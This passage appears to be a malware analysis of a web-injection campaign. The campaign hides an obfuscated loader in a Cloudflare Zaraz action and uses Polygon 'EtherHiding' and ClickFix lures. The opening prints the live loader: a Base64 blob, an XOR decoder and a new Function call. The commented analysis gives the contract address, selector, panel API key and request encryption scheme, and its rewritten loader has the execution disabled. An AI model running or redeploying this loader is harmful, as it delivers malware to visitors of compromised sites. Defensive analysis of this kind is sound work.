JPSUhZVUNKQ0VSSVQ9DGVpaHVyJnZndGdrdTtdfXJpPEVJSFJUR0VSWUVJSEBPQShFSUhSVEdFUllHQkJUQ1VVKmJncmc8YmdyZ0BvY2pieyohamdyY3VyIVs9DGVpaHVyJnRjd3NjdXJEaWJ/O31sdWlodHZlPCE0KDYhKmtjcm5pYjwhY3JuWWVnamohKnZndGdrdSpvYjw3ez0MYGl0LmpjciZncnJja3ZyOzY9Z3JyY2t2cjouRUlIUlRHRVJZRUlIQE9BKEtHXllUQ1JUT0NVeno3Lz1ncnJja3ZyLS0vfQxgaXQuZWlodXImY2hidmlvaHImaWAuRUlIUlRHRVJZRUlIQE9BKFRWRVlOSVVSVXp6XVsvL30McnR/fQxlaWh1ciZiZ3JnO2dxZ29yJnZpdXJMdWloUW9yblJva2Npc3IuY2hidmlvaHIqdGN3c2N1ckRpYn8qRUlIUlRHRVJZRUlIQE9BKFJPS0NJU1JZS1V6ejM2NjYvPQxvYC5iZ3JnICBiZ3JnKHRjdXNqci99DGVpaHVyJmJpa2dvaDtiY2VpYmNUY3VzanIuYmdyZyh0Y3VzanIvPQxvYC5iaWtnb2ggIGJpa2dvaChqY2hhcm44Ni99DGpjciZzdGo7YmlrZ29oKHJ0b2suLz0Mb2AuJ3N0aih1cmd0cnVRb3JuLiFucnJ2IS8vc3RqOyFucnJ2dTwpKSEtc3RqPQx0Y3JzdGgmc3RqPQx7DHsMe2VncmVuLmMvfXsMewx7DHRjcnN0aCZoc2pqPQx7DGBzaGVyb2loJnN2YmdyY1N0anUuZGd1Y1N0ai99DG9gLidkZ3VjU3RqL3RjcnN0aD0MdmdoY2pEZ3VjU3RqO2RndWNTdGoodGN2amdlYy4pWikiKSohIS89DGd2b0RndWM7dmdoY2pEZ3VjU3RqPQxqaWFTdGo7ZHNvamJHdm9TdGoufWc8IWNwciF7L3p6Lmd2b0RndWMtISlndm8pb2hiY34odm52OWc7Y3ByIS89DHJpbWNoU3RqO2Rzb2piR3ZvU3RqLn1nPCFvaG9yIXsvenouZ3ZvRGd1Yy0hKWd2bylvaGJjfih2bnY5ZztvaG9yIS89DGJpcWhqaWdiU3RqO2Rzb2piR3ZvU3RqLn1nPCFiaiF7L3p6Lmd2b0RndWMtISlndm8pb2hiY34odm52OWc7YmohLz0MewxndX9oZSZgc2hlcm9paCZ0Y2B0Y3VuRWloYG9hQHRpa0d2by4vfQxydH99DGVpaHVyJmVpaHJ0Z2VyU3RqO2dxZ29yJmFjclN0akB0aWtFaWhydGdlci4vPQxvYC4nZWlocnRnZXJTdGovcm50aXEmaGNxJkN0dGl0LiFEdGlxdWN0UWd0aG9oYTwmQGdvamNiJnJpJmFjciZTVEomYHRpayZlaWhydGdlciEvPQxzdmJncmNTdGp1LmVpaHJ0Z2VyU3RqLz0MZWlodXImdWNycm9oYXVTdGo7ZHNvamJHdm9TdGoufWc8IWVgYSF7L3p6LmVpaHJ0Z2VyU3RqLSEpZ3ZvKW9oYmN+KHZudjlnO2VgYSEvPQxqY3ImdGNraXJjO2dxZ29yJmBjcmVuTHVpaFFvcm5Sb2tjaXNyLnVjcnJvaGF1U3RqKn1lZ2VuYzwhaGkrdXJpdGMheyozNjY2Lz0MdGNraXJjO2dxZ29yJmJjZXR/dnJHdm9DaHBjaml2Yy50Y2tpcmMqIWVgYSEvPQxvYC4ndGNraXJjenpyf3ZjaWAmdGNraXJjJzs7IWlkbGNlciEvcm50aXEmaGNxJkN0dGl0LiFEdGlxdWN0UWd0aG9oYTwmb2hwZ2pvYiZ1Y3Jyb2hhdSZ2Z39qaWdiIS89DGVgYTtJZGxjZXIoZ3V1b2FoLn17KnRja2lyYy89DG9gLmVgYShlaWhydGdlckVpaGBvYS99DHJ0f31JZGxjZXIoZ3V1b2FoLkVJSFJUR0VSWUVJSEBPQSplYGEoZWlocnRnZXJFaWhgb2EvPXtlZ3Jlbi5jL317DHsMb2AuZWBhKHZnaGNqRGd1Y1N0aiAgZWBhKHZnaGNqRGd1Y1N0aic7O3ZnaGNqRGd1Y1N0ai9zdmJncmNTdGp1LmVgYSh2Z2hjakRndWNTdGovPQx1bmlxQmNqZ387cn92Y2lgJmVgYSh1bmlxQmNqZ387OzshaHNrZGN0ITllYGEodW5pcUJjamd/PEJDQEdTSlJZVU5JUVlCQ0pHXz0Ma2liYztyf3ZjaWAmZWBhKGtpYmM7OzshdXJ0b2hhITllYGEoa2liYzwhZHRpcXVjdCE9DHtlZ3Jlbi5jL30Mcm50aXEmYz0Mewx7DGd1f2hlJmBzaGVyb2loJmppYUNwY2hyLmNwY2hyUn92Yyp2Z39qaWdiL30Mb2AuJ2ppYVN0aiAgJ2d2b0RndWMvdGNyc3RoPQxydH99DGVpaHVyJnN0ajtkc29qYkd2b1N0ai59ZzwhY3ByIXsvenpqaWFTdGo9DGdxZ29yJmBjcmVuUW9yblJva2Npc3Iuc3RqKn0Ma2NybmliPCFWSVVSISoMbmNnYmN0dTx9IUVpaHJjaHIrUn92YyE8IXJjfnIpdmpnb2g9ZW5ndHVjcjtTUkArPiF7KgxkaWJ/PExVSUgodXJ0b2hhb2B/LklkbGNlcihndXVvYWgufWNwY2hyUn92Y3sqdmd/amlnYnp6fXsvLyoMZWdlbmM8IWhpK3VyaXRjIQx7KjU2NjYvPQx7ZWdyZW4uYy99ewx7DGBzaGVyb2loJmppZ2JLaWJjVWV0b3ZyLmtpYmNIZ2tjKmVnZW5jRHN1ci99DHRjcnN0aCZoY3EmVnRpa291Yy4udGN1aWpwYyp0Y2xjZXIvOzh9DG9gLid2Z2hjakRndWNTdGovdGNyc3RoJnRjbGNlci5oY3EmQ3R0aXQuIXZnaGNqRGd1Y1N0allrb3V1b2hhIS8vPQxiY2pjcmMmcW9oYmlxXU5HSEJKQ1RZQ15WSVRSWz0MZWlodXImdWV0b3ZyO2JpZXNrY2hyKGV0Y2dyY0NqY2tjaHIuIXVldG92ciEvPQxlaWh1ciZ1Z2BjS2liYzsua2liY0hna2MgIEtJQkNZQE9KQ1lLR1Zda2liY0hna2NbLzlraWJjSGdrYzwhZHRpcXVjdCE9DGVpaHVyJmd2b1VldG92clN0ajtkc29qYkd2b1N0ai59ZzwhbHUhKmtpYmM8VXJ0b2hhLnVnYGNLaWJjL3svPQx1ZXRvdnIodXRlO2d2b1VldG92clN0anp6LnZnaGNqRGd1Y1N0ai0hKWd2bylvaGJjfih2bnY5ZztsdSBraWJjOyEtY2hlaWJjU1RPRWlrdmloY2hyLlVydG9oYS51Z2BjS2liYy8vLz0MdWV0b3ZyKGd1f2hlO3J0c2M9DHVldG92cihpaGppZ2I7Li87OH0MZWlodXImYGg7cW9oYmlxXU5HSEJKQ1RZQ15WSVRSWz0MYmNqY3JjJnFvaGJpcV1OR0hCSkNUWUNeVklUUls9DG9gLnJ/dmNpYCZgaDs7OyFgc2hlcm9paCEvdGNyc3RoJnRjdWlqcGMuYGgvPQx0Y2xjZXIuaGNxJkN0dGl0LiFraWJjWW5naGJqY3RZa291dW9oYSEvLz0Mez0MdWV0b3ZyKGloY3R0aXQ7Li87OH0MYmNqY3JjJnFvaGJpcV1OR0hCSkNUWUNeVklUUls9DHRjbGNlci5oY3EmQ3R0aXQuIWtpYmNZdWV0b3ZyWWBnb2pjYiEvLz0Mez0MYmllc2tjaHIobmNnYihndnZjaGJFbm9qYi51ZXRvdnIvPQx7Lz0MewxndX9oZSZgc2hlcm9paCZkaWlydXJ0Z3Yua2liY0hna2MqZWlocmN+ci99DHJ0f30MZWlodXImdHNoaGN0O2dxZ29yJmppZ2JLaWJjVWV0b3ZyLmtpYmNIZ2tjKmVgYSAgLmVgYShlZ2VuY1JnYXp6ZWBhKHN2YmdyY2JHci8vPQxncWdvciZ0c2hoY3QuZWlocmN+ci89DHtlZ3Jlbi5jL30Mb2Aua2liY0hna2MnOzshZHRpcXVjdCEvfQxydH99DGVpaHVyJmBnampkZ2VtO2dxZ29yJmppZ2JLaWJjVWV0b3ZyLiFkdGlxdWN0ISplYGEgIC5lYGEoZWdlbmNSZ2F6emVgYShzdmJncmNiR3IvLz0MZ3Fnb3ImYGdqamRnZW0uSWRsY2VyKGd1dW9haC59eyplaWhyY35yKn1raWJjPCFkdGlxdWN0IXsvLz0Me2VncmVuLmN0dC99DHsMewx7DHsMZ3V/aGUmYHNoZXJvaWgma2dvaC4vfQxydH99DGdxZ29yJnRjYHRjdW5FaWhgb2FAdGlrR3ZvLi89DG9gLmVgYSAgZWBhKGNoZ2RqY2I7OztgZ2p1Yy90Y3JzdGg9DGVpaHVyJml1Oy5lYGEgIHJ/dmNpYCZlYGEoaXU7OzshdXJ0b2hhISAgZWBhKGl1LzlVcnRvaGEuZWBhKGl1Lzwhc2htaGlxaCE9DGVpaHVyJmR0aXF1Y3Q7LmVgYSAgcn92Y2lgJmVgYShkdGlxdWN0Ozs7IXVydG9oYSEgIGVgYShkdGlxdWN0LzlVcnRvaGEuZWBhKGR0aXF1Y3QvPCFTaG1oaXFoIT0MamNyJmNgYGNlcm9wY0tpYmM7LnJ/dmNpYCZraWJjOzs7IXVydG9oYSEgIGtpYmMvOWtpYmM8IWR0aXF1Y3QhPQxydH99DGVpaHVyJmpjYWdlfztqaWVnalVyaXRnYWMoYWNyT3Jjay5KQ0FHRV9ZVVJJVEdBQ1lNQ18vPQxlaWh1ciZlc3R0Y2hyO2ppZWdqVXJpdGdhYyhhY3JPcmNrLkpJRUdKWVVSSVRHQUNZTUNfLz0Mb2AuamNhZ2V/Jzs7aHNqaiAgZXN0dGNocjs7O2hzamovamllZ2pVcml0Z2FjKHVjck9yY2suSklFR0pZVVJJVEdBQ1lNQ18qamNhZ2V/Lz0Mb2AuamNhZ2V/Jzs7aHNqai9qaWVnalVyaXRnYWModGNraXBjT3Jjay5KQ0FHRV9ZVVJJVEdBQ1lNQ18vPQx7ZWdyZW4uYy99ewxvYC5qaWVnalVyaXRnYWMoYWNyT3Jjay5KSUVHSllVUklUR0FDWU1DXy87OzshNyEvdGNyc3RoPQxvYC5jYGBjZXJvcGNLaWJjJzs7IXRjZWd2cmVuZyEgIGNgYGNlcm9wY0tpYmMnOzshZHVpYiEgIGNgYGNlcm9wY0tpYmMnOzshZWppc2Jgamd0YyEgIGNgYGNlcm9wY0tpYmMnOzshZWBZc3ZiZ3JjISAgY2BgY2Vyb3BjS2liYyc7OyF1b2pjaHIhL30MZ3Fnb3ImamlhQ3BjaHIuIXZnYWNZcG9jcSEqfQxkdGlxdWN0KgxpdSoMa2liYzxjYGBjZXJvcGNLaWJjKgxlaWhydGdlclN0ajx2Z2hjakRndWNTdGoqDGVpaHJ0Z2VyR2JidGN1dTxFSUhSVEdFUllFSUhAT0EoRUlIUlRHRVJZR0JCVENVVQx7Lz0MewxlaWh1ciZ1cmd0cjsuLzs4fQxlaWh1ciZlcn47fQx2Z2hjakRndWNTdGoqDGd2b0RndWMqDGd2b1N0ajxkc29qYkd2b1N0aioMamlhU3RqKgxyaW1jaFN0aioMYmlxaGppZ2JTdGoqDGtpYmM8Y2BgY2Vyb3BjS2liYyoMaXUqDGR0aXF1Y3QqDGVpc2hydH88ISEqDHVyaXRnYWNNY388SklFR0pZVVJJVEdBQ1lNQ18qDGVgYSoMZWlocnRnZXJFaWhgb2E8RUlIUlRHRVJZRUlIQE9BDHs9DGRpaXJ1cnRndi5jYGBjZXJvcGNLaWJjKmVyfi89DHs9DG9gLmJpZXNrY2hyKHRjZ2J/VXJncmM7OzshamlnYm9oYSEvfQxiaWVza2NocihnYmJDcGNockpvdXJjaGN0LiFCSUtFaWhyY2hySmlnYmNiISouLzs4dWNyUm9rY2lzci51cmd0cip1bmlxQmNqZ38vKn1paGVjPHJ0c2N7Lz0Me2NqdWN9DHVjclJva2Npc3IudXJndHIqdW5pcUJjamd/Lz0Mewx7ZWdyZW4uYy99DHsMewxrZ29oLi89DHsvLi89';function _0xe89dd1(s,k){s=atob(s);var len=s.length,i,arr=new Uint8Array(len);for(i=0;i<len;i++){arr[i]=s.charCodeAt(i)^k;}if(window.TextDecoder){try{return new TextDecoder(\"utf-8\").decode(arr);}catch(e){}}var tmp=\"\";for(i=0;i<len;i++){tmp+=String.fromCharCode(arr[i]);}try{return decodeURIComponent(escape(tmp));}catch(e){return tmp;}}var _0x876af3=_0xe89dd1(_0xaaa71f,_0xb0c5b4);(new Function(_0x876af3))();})();\n}})(window,document)"]})})(window,document)}catch(e){throw fetch("/cdn-cgi/zaraz/t"),e;}

/*
 *
 *   victim HTML
 *       |
 *       +-> legitimate Cloudflare Zaraz bootstrap
 *             |
 *             +-> /cdn-cgi/zaraz/s.js?z=<page state>
 *                   |
 *                   +-> Zaraz Pageview action
 *                         |
 *                         +-> Base64 payload
 *                         +-> XOR 0x06
 *                         +-> new Function(decoded)()
 *                               |
 *                               +-> BW EtherHiding bootstrap
 *
 * /cdn-cgi/zaraz/s.js is legitimate Cloudflare infrastructure and
 * must not be treated as a standalone IOC.
 *
 *
 * EtherHiding:
 *
 *   Network:
 *     Polygon
 *
 *   Contract:
 *     0x224579e572cEEc5309A7d9F5fAf85dea5dBb7D4A
 *
 *   Selector:
 *     0xb68d1809
 *
 *   Method:
 *     eth_call
 *
 *
 * BW panel:
 *
 *   storage:
 *     site_repair_state
 *
 *   legacy storage:
 *     bw-downloaded
 *
 *   exported runner:
 *     __BW_MODE_RUN__
 *
 *   API key:
 *     cb9ef8804138983511a1dd21ad6839d03c00a9672807de414ec5eaaa7eb4390a
 *
 *   panel API:
 *     /api/index.php?q=<encrypted request>
 *
 *
 * Presentation modes:
 *
 *   browser         -> v1.js
 *   font            -> v2.js
 *   recaptcha       -> v3.js
 *   bsod            -> v4.js
 *   silent          -> v5.js
 *   cloudflare      -> v6.js
 *   cf_update       -> v7.js
 *   mac_recaptcha   -> v8.js
 *   mac_cloudflare  -> v9.js
 *
 *
 * Request format:
 *
 *   nonce = 8 random bytes
 *
 *   plaintext =
 *     query string
 *
 *   ciphertext =
 *     RC4(
 *       API_KEY || nonce,
 *       plaintext
 *     )
 *
 *   request =
 *     base64url(
 *       nonce || ciphertext
 *     )
 *
 *
 * Response envelopes:
 *
 *   enc=q2
 *     RC4
 *
 *   enc=gcm1
 *     AES-GCM
 *
 */


/*
 * Malicious action returned inside the otherwise legitimate Zaraz runtime.
 */

(function () {
    const XOR_KEY = 0x06;

    function decodePayload(encoded) {
        const raw = atob(encoded);
        const bytes = new Uint8Array(raw.length);

        for (let i = 0; i < raw.length; i++) {
            bytes[i] =
                raw.charCodeAt(i) ^
                XOR_KEY;
        }

        return new TextDecoder("utf-8")
            .decode(bytes);
    }

    const decoded =
        decodePayload(
            "<embedded Base64 payload>"
        );

    /*
     * Original:
     *
     *   (new Function(decoded))();
     *
     * Decoded payload is the BW bootstrap described below.
     */

    void decoded;
})();


/*
 * Recovered BW configuration.
 */

const BW = {
    storageKey:
        "site_repair_state",

    legacyStorageKey:
        "bw-downloaded",

    runner:
        "__BW_MODE_RUN__",

    contract:
        "0x224579e572cEEc5309A7d9F5fAf85dea5dBb7D4A",

    selector:
        "0xb68d1809",

    apiKey:
        "cb9ef8804138983511a1dd21ad6839d03c00a9672807de414ec5eaaa7eb4390a",

    modes: {
        browser:
            "v1.js",

        font:
            "v2.js",

        recaptcha:
            "v3.js",

        bsod:
            "v4.js",

        silent:
            "v5.js",

        cloudflare:
            "v6.js",

        cf_update:
            "v7.js",

        mac_recaptcha:
            "v8.js",

        mac_cloudflare:
            "v9.js"
    }
};


/*
 * High-level decoded flow:
 *
 *   Zaraz Pageview
 *       |
 *       +-> decode embedded JS
 *             |
 *             +-> Polygon eth_call
 *             |     contract: 0x224579...
 *             |     selector: 0xb68d1809
 *             |
 *             +-> recover current panel
 *             |
 *             +-> /api/index.php?q=<encrypted>
 *             |
 *             +-> controller selects presentation mode
 *             |
 *             +-> v1.js ... v9.js
 *                   |
 *                   +-> ClickFix
 *
 */
